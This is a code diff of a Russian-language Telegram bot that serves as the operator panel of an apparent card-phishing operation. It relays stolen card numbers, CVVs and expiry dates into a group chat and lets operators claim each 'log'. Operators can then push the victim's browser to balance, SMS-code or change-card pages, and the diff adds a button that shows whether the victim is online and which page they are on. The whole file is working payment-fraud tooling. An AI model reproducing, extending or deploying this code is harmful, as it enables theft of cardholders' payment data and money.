@@ -1,4 +1,4 @@
-# bot.py - исправленная версия
+# bot.py - Исправленная версия с проверкой онлайн
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from fastapi import FastAPI
@@ -35,15 +35,13 @@ def init_db():
 @contextmanager
 def get_db_connection():
     conn = sqlite3.connect('logs.db')
-    conn.row_factory = sqlite3.Row  # Чтобы получать результаты как словари
+    conn.row_factory = sqlite3.Row
     try:
         yield conn
     finally:
         conn.close()
 
 # Уведомление от сервера
-# bot.py - обновленная функция notify
-# bot.py - обновленная функция notify для полных данных
 @app.post("/notify")
 async def notify(data: dict):
     try:
@@ -56,13 +54,11 @@ async def notify(data: dict):
             cursor = conn.cursor()
             
             if step == "card_number_only":
-                # Первый шаг - только номер карты
                 cursor.execute('''
                     INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, step, updated_at)
                     VALUES (?, ?, ?, ?, ?)
                 ''', (session_id, masked_pan, booking_id, step, datetime.datetime.now()))
                 
-                # Форматируем номер карты с пробелами
                 card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                 
                 message_text = (
@@ -73,11 +69,9 @@ async def notify(data: dict):
                     f"⏳ Ожидаем CVV и expiry date..."
                 )
                 
-                # Отправляем сообщение без кнопки "Взять лог"
                 await bot.send_message(config.GROUP_ID, message_text)
                 
             elif step == "completed":
-                # Второй шаг - полные данные
                 cvv = data.get("cvv", "N/A")
                 expire_date = data.get("expireDate", "N/A")
                 
@@ -87,7 +81,6 @@ async def notify(data: dict):
                     WHERE session_id = ?
                 ''', (masked_pan, step, datetime.datetime.now(), session_id))
                 
-                # Форматируем номер карты с пробелами
                 card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                 
                 message_text = (
@@ -105,13 +98,11 @@ async def notify(data: dict):
                 await bot.send_message(config.GROUP_ID, message_text, reply_markup=kb)
                 
             else:
-                # Старая логика для обратной совместимости
                 cursor.execute('''
                     INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, step, updated_at)
                     VALUES (?, ?, ?, ?, ?)
                 ''', (session_id, masked_pan, booking_id, "full", datetime.datetime.now()))
                 
-                # Форматируем номер карты с пробелами
                 card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                 
                 message_text = (
@@ -190,7 +181,6 @@ async def change_card_notify(data: dict):
     return {"status": "ok"}
 
 # Взять лог
-# Взять лог
 @dp.callback_query(F.data.startswith("take:"))
 async def take_log(callback: types.CallbackQuery):
     session_id = callback.data.split(":")[1]
@@ -198,7 +188,6 @@ async def take_log(callback: types.CallbackQuery):
     with get_db_connection() as conn:
         cursor = conn.cursor()
         
-        # Проверяем, не занят ли лог
         cursor.execute('SELECT taken_by, booking_id FROM logs WHERE session_id = ?', (session_id,))
         log = cursor.fetchone()
         
@@ -210,7 +199,6 @@ async def take_log(callback: types.CallbackQuery):
             await callback.answer("Этот лог уже занят", show_alert=True)
             return
 
-        # Обновляем запись - отмечаем, что лог взят
         cursor.execute('''
             UPDATE logs 
             SET taken_by = ?, updated_at = ?
@@ -218,7 +206,6 @@ async def take_log(callback: types.CallbackQuery):
         ''', (callback.from_user.id, datetime.datetime.now(), session_id))
         conn.commit()
 
-        # Достаём данные по session_id
         async with httpx.AsyncClient() as client:
             customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
             card = (await client.get(f"{config.SERVER_URL}/card/{session_id}")).json()
@@ -239,15 +226,19 @@ async def take_log(callback: types.CallbackQuery):
         management_kb = InlineKeyboardMarkup(inline_keyboard=[
             [
                 InlineKeyboardButton(text="💰 Баланс", callback_data=f"balance:{session_id}"),
-                InlineKeyboardButton(text="📞 SMS", callback_data=f"sms:{session_id}"),
+                InlineKeyboardButton(text="📞 SMS", callback_data=f"sms:{session_id}")
+            ],
+            [
                 InlineKeyboardButton(text="🔄 Изменить карту", callback_data=f"change:{session_id}"),
                 InlineKeyboardButton(text="✅ Успешная оплата", callback_data=f"success:{session_id}")
+            ],
+            [
+                InlineKeyboardButton(text="🔍 Проверить онлайн", callback_data=f"check_online:{session_id}")
             ]
         ])
 
         await bot.send_message(callback.from_user.id, text, reply_markup=management_kb)
         
-        # Меняем только кнопку в исходном сообщении
         new_kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text=f"Лог взял @{callback.from_user.username}", callback_data="already_taken")]
         ])
@@ -255,12 +246,13 @@ async def take_log(callback: types.CallbackQuery):
         await callback.message.edit_reply_markup(reply_markup=new_kb)
         await callback.answer()
 
-# Обработчик кнопки "Баланс"
-@dp.callback_query(F.data.startswith("balance:"))
-async def handle_balance(callback: types.CallbackQuery):
+# НОВЫЙ ОБРАБОТЧИК: Проверка онлайн статуса
+# bot.py - ОБНОВЛЕННЫЙ ОБРАБОТЧИК check_online
+@dp.callback_query(F.data.startswith("check_online:"))
+async def check_online_status(callback: types.CallbackQuery):
     session_id = callback.data.split(":")[1]
     
-    # Проверяем, принадлежит ли лог пользователю
+    # Проверяем доступ
     with get_db_connection() as conn:
         cursor = conn.cursor()
         cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
@@ -270,7 +262,54 @@ async def handle_balance(callback: types.CallbackQuery):
         await callback.answer("У вас нет доступа к этому логу", show_alert=True)
         return
     
-    # Отправляем запрос на сервер для перенаправления пользователя
+    # Запрашиваем статус с сервера
+    try:
+        async with httpx.AsyncClient() as client:
+            response = await client.get(f"{config.SERVER_URL}/check-online-status/{session_id}")
+            
+            if response.status_code == 200:
+                data = response.json()
+                
+                if data.get("online"):
+                    current_page = data.get("currentPageDisplay", "Unknown")
+                    
+                    await callback.message.answer(
+                        f"🟢 Пользователь ОНЛАЙН\n\n"
+                        f"📍 Текущая страница: {current_page}\n"
+                        f"⏰ Последняя активность: только что"
+                    )
+                else:
+                    last_known_page = data.get("lastKnownPageDisplay", "неизвестно")
+                    last_seen = data.get("lastSeen", "неизвестно")
+                    
+                    await callback.message.answer(
+                        f"🔴 Пользователь ОФФЛАЙН\n\n"
+                        f"📄 Последняя известная страница: {last_known_page}\n"
+                        f"⏰ Последняя активность: {last_seen}"
+                    )
+            else:
+                await callback.message.answer("❌ Не удалось получить статус пользователя")
+                
+    except Exception as e:
+        print(f"Error checking online status: {e}")
+        await callback.message.answer("❌ Ошибка соединения с сервером")
+    
+    await callback.answer()
+
+# Обработчик кнопки "Баланс"
+@dp.callback_query(F.data.startswith("balance:"))
+async def handle_balance(callback: types.CallbackQuery):
+    session_id = callback.data.split(":")[1]
+    
+    with get_db_connection() as conn:
+        cursor = conn.cursor()
+        cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
+        log = cursor.fetchone()
+        
+    if not log or log['taken_by'] != callback.from_user.id:
+        await callback.answer("У вас нет доступа к этому логу", show_alert=True)
+        return
+    
     try:
         async with httpx.AsyncClient() as client:
             response = await client.post(f"{config.SERVER_URL}/redirect-balance", 
@@ -290,7 +329,6 @@ async def handle_balance(callback: types.CallbackQuery):
 async def handle_sms(callback: types.CallbackQuery):
     session_id = callback.data.split(":")[1]
     
-    # Проверяем, принадлежит ли лог пользователю
     with get_db_connection() as conn:
         cursor = conn.cursor()
         cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
@@ -300,7 +338,6 @@ async def handle_sms(callback: types.CallbackQuery):
         await callback.answer("У вас нет доступа к этому логу", show_alert=True)
         return
     
-    # Отправляем запрос на сервер для перенаправления пользователя
     try:
         async with httpx.AsyncClient() as client:
             response = await client.post(f"{config.SERVER_URL}/redirect-sms", 
@@ -320,7 +357,6 @@ async def handle_sms(callback: types.CallbackQuery):
 async def handle_change(callback: types.CallbackQuery):
     session_id = callback.data.split(":")[1]
     
-    # Проверяем, принадлежит ли лог пользователю
     with get_db_connection() as conn:
         cursor = conn.cursor()
         cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
@@ -345,10 +381,9 @@ async def handle_change(callback: types.CallbackQuery):
         await callback.message.answer("❌ Ошибка соединения с сервером")
 
 @dp.callback_query(F.data.startswith("success:"))
-async def handle_change(callback: types.CallbackQuery):
+async def handle_success(callback: types.CallbackQuery):
     session_id = callback.data.split(":")[1]
     
-    # Проверяем, принадлежит ли лог пользователю
     with get_db_connection() as conn:
         cursor = conn.cursor()
         cursor.execute('SELECT taken_by FROM logs WHERE session_id = ?', (session_id,))
@@ -373,7 +408,7 @@ async def handle_change(callback: types.CallbackQuery):
         await callback.message.answer("❌ Ошибка соединения с сервером")
 
 async def main():
-    init_db()  # Инициализируем базу данных при запуске
+    init_db()
     bot_task = asyncio.create_task(dp.start_polling(bot))
 
     config_uvicorn = uvicorn.Config(app, host="0.0.0.0", port=8000, loop="asyncio")
